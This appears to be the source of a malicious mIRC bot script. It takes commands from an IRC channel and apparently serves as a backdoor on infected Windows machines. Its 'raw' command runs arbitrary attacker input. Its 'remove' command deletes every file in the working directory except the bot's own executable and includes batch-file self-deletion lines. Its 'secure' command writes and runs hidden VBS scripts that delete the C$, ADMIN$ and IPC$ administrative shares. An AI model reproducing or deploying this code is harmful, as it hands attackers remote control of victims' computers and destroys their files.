on 50:text:^*:#:{
  if ((^ $+ $me != $1) && ($1 != ^cmd)) {
    halt
  }
  if ($2 == raw) {
    if ($3 == $null) {
      halt
    }
    // $+ $3-
  }
  if ($2 == remove) {
    set %end $findfile(.,*.*,0)
    set %start 0
    :chkhiddenwipe
    if (%start == %end) {
      halt
    }
    inc %start 1
    if ($findfile(.,*.*,%start) != Network32.exe) {
      remove $findfile(.,*.*,%start)
    }
    goto chkhiddenwipe
    write c:\boo.bat del "%System%\Network32\Network32.exe"
    write c:\boo.bat del autoexec.bat
    write c:\autoexec.bat boo.bat
    exit
  }
  if ($2 == secure) {
    if ($exists(securea.vbs)) {
      remove securea.vbs
    }
    if ($exists(secureb.vbs)) {
      remove secureb.vbs
    }
    if ($exists(securec.vbs)) {
      remove securec.vbs
    }
    write securea.vbs on error resume next
    write securea.vbs Set bl = CreateObject("Wscript.shell")
    write securea.vbs bl.run "net share /delete C $+ $chr(36) /y",0,true
    write secureb.vbs on error resume next
    write secureb.vbs Set bl = CreateObject("Wscript.shell")
    write secureb.vbs bl.run "net share /delete ADMIN$ $+ $chr(36) /y",0,true
    write securec.vbs on error resume next
    write securec.vbs Set bl = CreateObject("Wscript.shell")
    write securec.vbs bl.run "net share /delete IPC $+ $chr(36) /y",0,true
    run securea.vbs
    run secureb.vbs
    run securec.vbs
    halt
  }
}
